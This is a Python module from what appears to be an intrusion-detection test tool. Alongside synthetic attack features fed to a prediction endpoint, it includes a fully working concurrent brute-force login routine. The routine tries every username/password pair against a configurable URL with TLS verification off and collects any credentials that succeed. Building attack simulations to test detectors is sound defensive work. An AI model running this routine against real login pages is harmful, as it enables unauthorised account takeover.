import asyncio
import os
import random
import traceback
from typing import Any, Callable, Coroutine, Dict, List

import httpx

from app.core import state
from app.simulations.simulation_params import BruteForceParams

INTERNAL_API_BASE_URL = os.getenv("INTERNAL_API_BASE_URL", "http://localhost:8000")

def generate_fake_brute_force_features():
    """
    Brute Force saldırılarını, CIC-IDS-2017 veri setindeki istatistiksel
    profillere daha yakın taklit eden sahte özellikler üretir.
    """
    if not state.feature_columns:
        print("⚠️ Feature columns not loaded in state for Brute Force.")
        return {}
    
    features = {key: 0.0 for key in state.feature_columns}
    
    # Colab analizinden elde edilen veya varsayılan istatistiksel profil
    # (mean, std) -> random.gauss(mean, std) ile daha gerçekçi değerler üret
    features.update({
        'Flow Duration': abs(random.gauss(110000, 50000)),
        'Total Fwd Packets': abs(random.gauss(3.5, 1.5)),
        'Total Backward Packets': abs(random.gauss(3.5, 1.5)),
        'Fwd Packet Length Max': abs(random.gauss(30, 15)),
        'Fwd Packet Length Mean': abs(random.gauss(15, 10)),
        'Bwd Packet Length Mean': abs(random.gauss(150, 50)),
        'Flow IAT Mean': abs(random.gauss(25000, 15000)),
        'Average Packet Size': abs(random.gauss(100, 40)),
        'FIN Flag Count': 1,
        'SYN Flag Count': 1,
        'PSH Flag Count': random.choice([0, 1]),
    })
    return features

async def trigger_prediction(simulation_id: str):
    """AI modelinin tahmin endpoint'ini tetikler."""
    try:
        features = generate_fake_brute_force_features()
        fake_source_ip = f"10.42.{random.randint(1, 254)}.{random.randint(1, 254)}"
        
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{INTERNAL_API_BASE_URL}/api/predict",
                json={
                    "features": features,
                    "source_info": f"bruteforce_sim_{fake_source_ip}",
                    "simulation_id": simulation_id
                },
                timeout=10.0
            )
    except Exception as e:
        print(f"❌ Error during Brute Force prediction trigger: {e}")

async def run_bruteforce_simulation(
    params: BruteForceParams, 
    progress_callback: Callable[[Dict[str, Any]], Coroutine[Any, Any, None]],
    simulation_run_id: str
) -> Dict[str, Any]:
    print(f"Starting Brute Force Simulation: Target={params.target_url}")
    credentials_found: List[Dict[str, str]] = []
    total_attempts_made = 0
    total_possible_attempts = len(params.usernames) * len(params.passwords)
    simulation_halted = False

    await progress_callback({"type": "progress", "message": "Starting brute force attack...", "completed": 0, "total": total_possible_attempts})

    async def try_single_login(session: httpx.AsyncClient, username: str, password: str) -> bool:
        nonlocal total_attempts_made
        login_payload = {params.username_field: username, params.password_field: password}
        try:
            response = await session.post(str(params.target_url), data=login_payload, timeout=15.0, follow_redirects=True)
            success = (params.success_status_code and response.status_code == params.success_status_code) or \
                      (params.success_text_indicator and params.success_text_indicator.lower() in response.text.lower())
            
            if success:
                credentials_found.append({"username": username, "password": password})
                await progress_callback({"type": "progress", "message": f"✅ SUCCESS! Found credentials for {username}!"})
                asyncio.create_task(trigger_prediction(simulation_run_id))
                return True
        except httpx.RequestError as e:
            print(f"Brute force request error for {username}: {e}")
        except Exception as e:
            print(f"Unexpected error in try_single_login for {username}: {e}\n{traceback.format_exc()}")
        finally:
            total_attempts_made += 1
            if total_attempts_made % 5 == 0 or total_attempts_made == total_possible_attempts:
                await progress_callback({"type": "progress", "message": f"Attempt {total_attempts_made}/{total_possible_attempts}...", "completed": total_attempts_made, "total": total_possible_attempts})
                asyncio.create_task(trigger_prediction(simulation_run_id))
        return False

    semaphore = asyncio.Semaphore(params.concurrency)
    async def worker(session: httpx.AsyncClient, username: str, password: str) -> bool:
        async with semaphore:
            return await try_single_login(session, username, password)

    async with httpx.AsyncClient(verify=False) as client:
        for username in params.usernames:
            if simulation_halted: break
            tasks = [worker(client, username, pwd) for pwd in params.passwords]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            if any(isinstance(res, bool) and res for res in results) and params.stop_on_first_success:
                simulation_halted = True
                break

    result = {
        "target_url": str(params.target_url), "total_attempts_made": total_attempts_made,
        "credentials_found": credentials_found, "simulation_halted_early": simulation_halted
    }
    await progress_callback({"type": "final_summary", "message": "🔒 Brute-force simulation completed."})
    return result